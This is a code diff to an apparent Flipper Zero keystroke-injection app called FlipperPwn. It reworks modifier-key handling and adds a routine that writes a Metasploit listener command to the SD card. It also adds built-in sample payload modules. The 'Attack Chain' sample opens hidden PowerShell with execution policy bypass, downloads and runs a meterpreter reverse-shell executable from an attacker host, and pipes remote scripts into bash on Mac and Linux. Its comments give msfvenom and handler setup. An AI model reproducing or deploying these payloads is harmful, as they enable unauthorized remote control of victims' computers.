@@ -281,12 +281,11 @@ static void fpwn_type_char(char c) {
     }
 
     if(need_shift) {
-        furi_hal_hid_kb_press(HID_KEYBOARD_L_SHIFT);
-    }
-    furi_hal_hid_kb_press(keycode);
-    furi_hal_hid_kb_release(keycode);
-    if(need_shift) {
-        furi_hal_hid_kb_release(HID_KEYBOARD_L_SHIFT);
+        furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | keycode);
+        furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | keycode);
+    } else {
+        furi_hal_hid_kb_press(keycode);
+        furi_hal_hid_kb_release(keycode);
     }
     /* Small inter-key delay to avoid dropped keystrokes */
     furi_delay_ms(5);
@@ -499,12 +498,9 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
     if(strncmp(line, "CTRL ALT ", 9) == 0) {
         uint16_t kc = fpwn_named_key(line + 9);
         if(kc) {
-            furi_hal_hid_kb_press(HID_KEYBOARD_L_CTRL);
-            furi_hal_hid_kb_press(HID_KEYBOARD_L_ALT);
-            furi_hal_hid_kb_press(kc);
-            furi_hal_hid_kb_release(kc);
-            furi_hal_hid_kb_release(HID_KEYBOARD_L_ALT);
-            furi_hal_hid_kb_release(HID_KEYBOARD_L_CTRL);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | kc);
         }
         return;
     }
@@ -513,10 +509,9 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
     if(strncmp(line, "CTRL ", 5) == 0) {
         uint16_t kc = fpwn_named_key(line + 5);
         if(kc) {
-            furi_hal_hid_kb_press(HID_KEYBOARD_L_CTRL);
-            furi_hal_hid_kb_press(kc);
-            furi_hal_hid_kb_release(kc);
-            furi_hal_hid_kb_release(HID_KEYBOARD_L_CTRL);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | kc);
         }
         return;
     }
@@ -525,10 +520,9 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
     if(strncmp(line, "ALT ", 4) == 0) {
         uint16_t kc = fpwn_named_key(line + 4);
         if(kc) {
-            furi_hal_hid_kb_press(HID_KEYBOARD_L_ALT);
-            furi_hal_hid_kb_press(kc);
-            furi_hal_hid_kb_release(kc);
-            furi_hal_hid_kb_release(HID_KEYBOARD_L_ALT);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | kc);
         }
         return;
     }
@@ -537,10 +531,9 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
     if(strncmp(line, "SHIFT ", 6) == 0) {
         uint16_t kc = fpwn_named_key(line + 6);
         if(kc) {
-            furi_hal_hid_kb_press(HID_KEYBOARD_L_SHIFT);
-            furi_hal_hid_kb_press(kc);
-            furi_hal_hid_kb_release(kc);
-            furi_hal_hid_kb_release(HID_KEYBOARD_L_SHIFT);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | kc);
         }
         return;
     }
@@ -557,10 +550,9 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
     if(gui_arg) {
         uint16_t kc = fpwn_named_key(gui_arg);
         if(kc) {
-            furi_hal_hid_kb_press(HID_KEYBOARD_L_GUI);
-            furi_hal_hid_kb_press(kc);
-            furi_hal_hid_kb_release(kc);
-            furi_hal_hid_kb_release(HID_KEYBOARD_L_GUI);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | kc);
         }
         return;
     }
@@ -763,7 +755,7 @@ void fpwn_modules_scan(FPwnApp* app) {
         return;
     }
 
-    char fname[128];
+    char fname[100]; /* 23 (modules dir) + 1 (/) + 99 = 123 < FPWN_PATH_LEN */
     FileInfo finfo;
 
     while(app->module_count < FPWN_MAX_MODULES) {
@@ -1076,10 +1068,216 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
     }
     view_commit_model(app->execute_view, true);
 
+    /* Write post-run guide to SD card so the user has a ready reference.
+     * Saved to /ext/flipperpwn/last_run.txt — always overwritten. */
+    {
+        const char* guide_path = EXT_PATH("flipperpwn/last_run.txt");
+        File* gf = storage_file_alloc(app->storage);
+        if(storage_file_open(gf, guide_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+            char buf[256];
+            snprintf(
+                buf,
+                sizeof(buf),
+                "FlipperPwn Last Run\n"
+                "===================\n"
+                "Module : %s\n"
+                "Desc   : %s\n"
+                "\nOptions\n"
+                "-------\n",
+                module->name,
+                module->description);
+            storage_file_write(gf, buf, (uint16_t)strlen(buf));
+
+            for(uint8_t i = 0; i < module->option_count; i++) {
+                snprintf(
+                    buf,
+                    sizeof(buf),
+                    "  %-12s = %s\n",
+                    module->options[i].name,
+                    module->options[i].value);
+                storage_file_write(gf, buf, (uint16_t)strlen(buf));
+            }
+
+            /* If LHOST + LPORT are present, write MSF listener command */
+            const char* lhost = NULL;
+            const char* lport = NULL;
+            for(uint8_t i = 0; i < module->option_count; i++) {
+                if(strcmp(module->options[i].name, "LHOST") == 0) lhost = module->options[i].value;
+                if(strcmp(module->options[i].name, "LPORT") == 0) lport = module->options[i].value;
+            }
+            if(lhost && lport) {
+                snprintf(
+                    buf,
+                    sizeof(buf),
+                    "\nMSF Listener\n"
+                    "------------\n"
+                    "msfconsole -x \""
+                    "use exploit/multi/handler; "
+                    "set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
+                    "set LHOST %s; "
+                    "set LPORT %s; "
+                    "exploit\"\n",
+                    lhost,
+                    lport);
+                storage_file_write(gf, buf, (uint16_t)strlen(buf));
+            }
+            storage_file_close(gf);
+            FURI_LOG_I(TAG, "Guide written to %s", guide_path);
+        }
+        storage_file_free(gf);
+    }
+
     FURI_LOG_I(
         TAG,
         "Execute complete: %lu/%lu lines",
         (unsigned long)lines_done,
         (unsigned long)lines_total);
     return 0;
+}
+
+/* =========================================================================
+ * Sample module writer
+ * =========================================================================
+ * Writes built-in sample .fpwn files to SD card on first launch (when the
+ * modules directory is empty).  Two samples are provided:
+ *   sysinfo.fpwn   — Recon: open a terminal and dump basic system info
+ *   lock_screen.fpwn — Post: lock the workstation
+ * ========================================================================= */
+
+/* System Info — opens a terminal and dumps host/user/IP info */
+static const char SAMPLE_SYSINFO[] =
+    "NAME System Info Recon\n"
+    "DESCRIPTION Opens terminal, dumps hostname, username, and IP address\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "STRING Write-Host \"HOST:$env:COMPUTERNAME USER:$env:USERNAME\"\n"
+    "ENTER\n"
+    "DELAY 200\n"
+    "STRING ipconfig | Select-String IPv4\n"
+    "ENTER\n"
+    "DELAY 200\n"
+    "STRING $PSVersionTable.PSVersion\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING echo HOST:$(hostname) USER:$(whoami) && ifconfig | grep 'inet ' | grep -v 127 && sw_vers\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING echo HOST:$(hostname) USER:$(whoami) && ip addr | grep 'inet ' | grep -v 127 && uname -a\n"
+    "ENTER\n";
+
+/* Lock Screen — locks the workstation */
+static const char SAMPLE_LOCK_SCREEN[] = "NAME Lock Screen\n"
+                                         "DESCRIPTION Locks the workstation screen immediately\n"
+                                         "CATEGORY post\n"
+                                         "PLATFORMS WIN,MAC,LINUX\n"
+                                         "OPTION DELAY 500 \"Pre-lock delay (ms)\"\n"
+                                         "PLATFORM WIN\n"
+                                         "DELAY {{DELAY}}\n"
+                                         "GUI l\n"
+                                         "PLATFORM MAC\n"
+                                         "DELAY {{DELAY}}\n"
+                                         "GUI SPACE\n"
+                                         "DELAY 700\n"
+                                         "STRING Lock Screen\n"
+                                         "ENTER\n"
+                                         "PLATFORM LINUX\n"
+                                         "DELAY {{DELAY}}\n"
+                                         "CTRL ALT l\n";
+
+/* Attack Chain — recon + staged reverse shell + lock */
+static const char SAMPLE_ATTACK_CHAIN[] =
+    "NAME Attack Chain\n"
+    "DESCRIPTION Recon, staged reverse shell download, screen lock\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION LHOST 192.168.1.100 \"Attacker IP (your machine)\"\n"
+    "OPTION LPORT 4444 \"Metasploit listener port\"\n"
+    "OPTION WEBPORT 8080 \"HTTP server port serving payload\"\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "# SETUP: On your machine run:\n"
+    "#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o s.exe\n"
+    "#   python3 -m http.server {{WEBPORT}}\n"
+    "#   msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST}}; set LPORT {{LPORT}}; exploit'\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass -w hidden\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "STRING \"HOST:$env:COMPUTERNAME USER:$env:USERNAME IP:$((ipconfig|sls 'IPv4 Address').ToString().Split(':')[1].Trim())\" | Out-File $env:TEMP\\r.txt\n"
+    "ENTER\n"
+    "DELAY 400\n"
+    "STRING IWR http://{{LHOST}}:{{WEBPORT}}/s.exe -OutFile $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "GUI l\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING curl -s http://{{LHOST}}:{{WEBPORT}}/mac.sh | bash &\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Lock Screen\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING curl -s http://{{LHOST}}:{{WEBPORT}}/lin.sh | bash &\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "CTRL ALT l\n";
+
+static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
+    File* f = storage_file_alloc(storage);
+    if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
+        FURI_LOG_W(TAG, "sample exists or open failed: %s", path);
+        storage_file_free(f);
+        return false;
+    }
+    uint32_t len = (uint32_t)strlen(content);
+    uint16_t written = storage_file_write(f, content, (uint16_t)len);
+    storage_file_close(f);
+    storage_file_free(f);
+    return (written == (uint16_t)len);
+}
+
+void fpwn_modules_write_samples(FPwnApp* app) {
+    /* Write each sample file if it does not already exist.
+     * fpwn_write_sample_file uses FSOM_CREATE_NEW so existing files
+     * (including user-modified ones) are never overwritten. */
+    char path[FPWN_PATH_LEN];
+
+    snprintf(path, sizeof(path), "%s/sysinfo.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_SYSINFO);
+
+    snprintf(path, sizeof(path), "%s/lock_screen.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_LOCK_SCREEN);
+
+    snprintf(path, sizeof(path), "%s/attack_chain.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_ATTACK_CHAIN);
 }
